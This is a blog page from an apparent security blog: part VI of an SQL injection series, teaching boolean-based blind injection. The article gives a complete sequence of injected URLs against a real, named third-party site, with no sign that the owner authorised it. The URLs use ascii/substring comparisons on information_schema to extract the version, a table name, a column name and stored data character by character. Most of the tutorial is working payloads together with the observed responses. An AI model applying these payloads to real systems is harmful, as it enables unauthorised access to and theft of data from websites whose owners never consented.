@@ -1,0 +1,455 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>SQLi--PART VI:Boolean Based Blind Injection |     tudouya&#39;s secblog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="tudouya">
+    
+    <meta name="description" content="PrefaceSo a lot of people view bling injection as having to guess everything, when it’s called blind injection because no data is visible on the page ">
+    
+    
+    
+    
+    <link rel="alternative" href="/atom.xml" title="    tudouya&#39;s secblog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <link href="//cdn.bootcss.com/highlight.js/9.1.0/styles/railscasts.min.css" rel="stylesheet">
+    <style type="text/css">
+      figure {
+        overflow-x: auto;
+      }
+    </style>
+</head>
+
+  <body>
+    <header>
+      <div>
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="    tudouya&#39;s secblog">    tudouya&#39;s secblog</a></h1>
+				<h2 class="blog-motto">~The quieter you become,the more you can hear~</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/sitemap.xml">sitemap</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li><form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:sec.php101.cn">
+					</form></li>
+				</ul>
+			</nav>
+</div>
+    </header>
+    <div id="wrap">
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+    <time datetime="2014-11-28T02:24:33.000Z" itemprop="datePublished">
+      <a href="/2014/11/28/SQLi--PART-VIBoolean-Based-Blind-Injection/" title="SQLi--PART VI:Boolean Based Blind Injection" itemprop="url" class="article-time">2014-11-28</a>
+    </time>
+
+  <h1 itemprop="name" class="article-name">
+    
+      <a href="/2014/11/28/SQLi--PART-VIBoolean-Based-Blind-Injection/" title="SQLi--PART VI:Boolean Based Blind Injection" itemprop="url"><span>SQLi--PART VI:Boolean Based Blind Injection</span></a>
+  </h1>
+</header>
+
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step1-Getting-The-Version"><span class="toc-number">2.</span> <span class="toc-text">Step1:Getting The Version</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step2-Getting-The-Table-Names"><span class="toc-number">3.</span> <span class="toc-text">Step2:Getting The Table Names</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step3-Getting-The-Column-Names"><span class="toc-number">4.</span> <span class="toc-text">Step3:Getting The Column Names</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step4-Getting-Data-Out-Of-Columns"><span class="toc-number">5.</span> <span class="toc-text">Step4:Getting Data Out Of Columns</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>So a lot of people view bling injection as having to guess everything, when it’s called blind injection because <strong>no data is visible on the page as an outcome</strong>.</p>
+<p><strong>Remember, whenever you’re injecting a site, as long as information_schema exists (version 5 or more), then you can use it to get data out of a page.</strong> This includes table names, database names, columns, and all the rest..</p>
+<p>I’ll be using this site as an example.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1</span><br></pre></td></tr></table></figure></p>
+<h2 id="Step1-Getting-The-Version"><a href="#Step1-Getting-The-Version" class="headerlink" title="Step1:Getting The Version"></a>Step1:Getting The Version</h2><p>Let’s start by getting the version, to see if we can use substring() to get data out of information_schema.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1 and substring(version(),1,1)=5</span><br></pre></td></tr></table></figure></p>
+<p>It loads fine, now let’s replace the 5 with a 4 to double check.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1 and substring(version(),1,1)=4</span><br></pre></td></tr></table></figure></p>
+<p>As you can see, the page has a huge chunk of text and pictures missing off of the page.</p>
+<h2 id="Step2-Getting-The-Table-Names"><a href="#Step2-Getting-The-Table-Names" class="headerlink" title="Step2:Getting The Table Names"></a>Step2:Getting The Table Names</h2><p>Now let’s get the first character, of the first table name out of our database.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),1,1))&gt;0</span><br></pre></td></tr></table></figure></p>
+<p>The page loaded fine, so we know our first characters’ ascii value is more then 0.<br>So we increment 0 until we get around the area it will be in.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),1,1))&gt;75</span><br></pre></td></tr></table></figure></p>
+<p>We know it’s more then 75, so let’s go up a little bit more.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),1,1))&gt;80</span><br></pre></td></tr></table></figure></p>
+<p>Now we get our error, so let’s go down, and change more then, to equals to get the exact value.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),1,1))=76</span><br></pre></td></tr></table></figure></p>
+<p>We get our error, so let’s go up.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),1,1))=77</span><br></pre></td></tr></table></figure></p>
+<p>Another error, let’s go up again.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),1,1))=78</span><br></pre></td></tr></table></figure></p>
+<p>And now it loads fine, so let’s check the ascii value for 78.<br>You can check that here, by looking at the ASCII table.<br>78 comes back to “N”.<br>Now we know our first letter is <strong>N</strong>, so let’s get the next letter by incrementing the 1, to a 2, in our substring() statement.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),2,1))&gt;100</span><br></pre></td></tr></table></figure></p>
+<p>We know it’s more then 100, so let’s go up to 101 now.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),2,1))&gt;101</span><br></pre></td></tr></table></figure></p>
+<p>We get our error. If the returned value is greater then 100, but not greater then 101, then it has to be 101. It’s common sense.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),2,1))=101</span><br></pre></td></tr></table></figure></p>
+<p>And it loads fine…Now convert the ascii value of 101 to text. It comes back to “e”.<br>So far we have “Ne”<br>Now you can either keep getting the returned values, or try and guess the table name. It looks like News, so let’s get our next character and guess.<br>The ascii value of “w” is 119, so let’s see if it comes out positive.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),3,1))=119</span><br></pre></td></tr></table></figure></p>
+<p>It loads fine, so now we have “New”.<br>Lets check the last one…<br>The value of “s” is 115, so let’s guess again.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),4,1))=115</span><br></pre></td></tr></table></figure></p>
+<p>Now we have our “News” table, but how do we know if there’s more characters or not? We can check if the 5th letter’s ascii value is &gt; 0, and if it’s not, it doesn’t exist. So let’s check.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(table_name)+from+information_schema.tables+where+table_schema=database()+​limit+0,1),5,1))&gt;0</span><br></pre></td></tr></table></figure></p>
+<p>And the page loads with an error.</p>
+<h2 id="Step3-Getting-The-Column-Names"><a href="#Step3-Getting-The-Column-Names" class="headerlink" title="Step3:Getting The Column Names"></a>Step3:Getting The Column Names</h2><p>Getting the columns is fairly similar to getting the table names, you just add a where clause, and convert your table name to HEX/ASCII characters.<br>Let’s see if our table even has columns first.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(column_name)+from+information_schema.columns+where+table_name=0x4e657773+​limit+0,1),1,1))&gt;0</span><br></pre></td></tr></table></figure></p>
+<p>Page loads fine, so we have a first character that’s value is more then 0. Now let’s get the column name.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(column_name)+from+information_schema.columns+where+table_name=0x4e657773+​limit+0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure></p>
+<p>No errors, let’s go up.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(column_name)+from+information_schema.columns+where+table_name=0x4e657773+​limit+0,1),1,1))&gt;105</span><br></pre></td></tr></table></figure></p>
+<p>Error, it’s between 100 and 105.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(column_name)+from+information_schema.columns+where+table_name=0x4e657773+​limit+0,1),1,1))=105</span><br></pre></td></tr></table></figure></p>
+<p>Loads fine, the value of 105 is “i”.<br>Then we repeat the process, until we get our next character.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(column_name)+from+information_schema.columns+where+table_name=0x4e657773+​limit+0,1),2,1))&gt;95</span><br></pre></td></tr></table></figure></p>
+<p>No error, let’s try 100.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(column_name)+from+information_schema.columns+where+table_name=0x4e657773+​limit+0,1),2,1))&gt;100</span><br></pre></td></tr></table></figure></p>
+<p>Error, let’s see if it = 100.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(column_name)+from+information_schema.columns+where+table_name=0x4e657773+​limit+0,1),2,1))=100</span><br></pre></td></tr></table></figure></p>
+<p>No error, so now we have “id”. Theres your first column, to get the next one, you’d just increase the limit and start over on your substring() statement.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(column_name)+from+information_schema.columns+where+table_name=0x4e657773+​limit+1,1),1,1))&gt;0</span><br></pre></td></tr></table></figure></p>
+<h2 id="Step4-Getting-Data-Out-Of-Columns"><a href="#Step4-Getting-Data-Out-Of-Columns" class="headerlink" title="Step4:Getting Data Out Of Columns"></a>Step4:Getting Data Out Of Columns</h2><p>It’s the same process, except we put our column names in a concat statement, FROM the TABLENAME.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(id)+from+News+limit+0,1),1,1))&gt;0</span><br></pre></td></tr></table></figure></p>
+<p>So let’s get our first character..<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(id)+from+News+limit+0,1),1,1))&gt;45</span><br></pre></td></tr></table></figure></p>
+<p>No error, let’s go up.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(id)+from+News+limit+0,1),1,1))&gt;50</span><br></pre></td></tr></table></figure></p>
+<p>Error, go back down until you find the right one.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(id)+from+News+limit+0,1),1,1))=49</span><br></pre></td></tr></table></figure></p>
+<p>Loads fine, and the ascii value of 49 comes back to “1”.<br>Now let’s check if there’s a second character..<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cathedralhillpress.com/book.php?id=1+and+ascii(substring((select concat(id)+from+News+limit+0,1),2,1))&gt;0</span><br></pre></td></tr></table></figure></p>
+<p>We get an error, so that was all that was our first result.</p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>As you can see, “Blind Injection” doesn’t really have to do with guessing, as long as your site has information_schema. The correct term is actually “Boolean Based Blind Injection”, which makes sense. A Boolean returns a value of true/false, which is what we just went over.  </p>
+<p>Well guys, that’s it. Hope you understand, let me know if you need anything.<br><br></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/A-SQLi/">A-SQLi</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/Blind/">Blind</a><a href="/tags/Boolean-Based/">Boolean Based</a>
+  </div>
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://sec.php101.cn/2014/11/28/SQLi--PART-VIBoolean-Based-Blind-Injection/" data-title="SQLi--PART VI:Boolean Based Blind Injection |     tudouya&#39;s secblog" data-tsina="undefined" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2014/12/02/SQLi--PART-VIITime-Based-Blind-Injection/" title="SQLi--PART VII:Time Based Blind Injection">
+  <strong>上一篇：</strong><br/>
+  <span>
+  SQLi--PART VII:Time Based Blind Injection</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2014/11/10/SQLi--PART-VString-Based-SQL-injection/"  title="SQLi--PART V:String Based SQL injection">
+ <strong>下一篇：</strong><br/> 
+ <span>SQLi--PART V:String Based SQL injection
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step1-Getting-The-Version"><span class="toc-number">2.</span> <span class="toc-text">Step1:Getting The Version</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step2-Getting-The-Table-Names"><span class="toc-number">3.</span> <span class="toc-text">Step2:Getting The Table Names</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step3-Getting-The-Column-Names"><span class="toc-number">4.</span> <span class="toc-text">Step3:Getting The Column Names</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step4-Getting-Data-Out-Of-Columns"><span class="toc-number">5.</span> <span class="toc-text">Step4:Getting Data Out Of Columns</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+			<li><a href="/categories/A-SQLi/" title="A-SQLi">A-SQLi<sup>7</sup></a></li>
+		
+			<li><a href="/categories/B-XSS/" title="B-XSS">B-XSS<sup>2</sup></a></li>
+		
+			<li><a href="/categories/H-AttackFlow/" title="H-AttackFlow">H-AttackFlow<sup>1</sup></a></li>
+		
+			<li><a href="/categories/T-Tools/" title="T-Tools">T-Tools<sup>1</sup></a></li>
+		
+			<li><a href="/categories/Z-Other/" title="Z-Other">Z-Other<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/Blind/" title="Blind">Blind<sup>2</sup></a></li>
+		
+			<li><a href="/tags/Boolean-Based/" title="Boolean Based">Boolean Based<sup>2</sup></a></li>
+		
+			<li><a href="/tags/Dork/" title="Dork">Dork<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Double-Query/" title="Double Query">Double Query<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Error-Based/" title="Error Based">Error Based<sup>1</sup></a></li>
+		
+			<li><a href="/tags/MegaSQLi/" title="MegaSQLi">MegaSQLi<sup>4</sup></a></li>
+		
+			<li><a href="/tags/String-Based/" title="String Based">String Based<sup>1</sup></a></li>
+		
+			<li><a href="/tags/crypt/" title="crypt">crypt<sup>1</sup></a></li>
+		
+			<li><a href="/tags/hash/" title="hash">hash<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+</div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+<div>
+<br />
+</div>
+
+    </div>
+</div>
+    <footer><div id="footer" >
+	
+    <div class="social-font" class="clearfix">
+        
+        <a href="http://weibo.com/5050395856" target="_blank" class="icon-weibo" title="weibo"></a>
+        
+        
+        <a href="https://github.com/tudouya" target="_blank" class="icon-github" title="github"></a>
+        
+        
+        
+        
+        
+        
+        <a href="mailto:568865013@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+        
+    </div>
+	<section class="info">
+		<p class="l1">
+            keep foolish~keep hungry
+        </p>
+            <!-- <br/> -->
+        <p class="l2">
+			～如果我们不选择堕落，那么地狱的存在还有什么意义～
+        </p>
+	</section>
+	 
+		<p class="copyright">Powered by <a href="http://zespia.tw/hexo/" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/RagingCat/hexo-theme-ragingcat" target="_blank" title="hexo-theme-ragingcat">Raging Cat</a> © 2016
+		
+		<a href="http://sec.php101.cn/about" target="_blank" title="tudouya">tudouya</a>
+		
+		</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize();
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+      
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"ragingcat"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<style type="text/css">
+</style>
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script><script type="text/javascript">
+$(document).ready(function(){
+    $('pre').each(function(i, block) {
+      hljs.highlightBlock(block);
+    });
+    $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+});
+</script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-60243036-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript"
+   src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+  </body>
+</html>
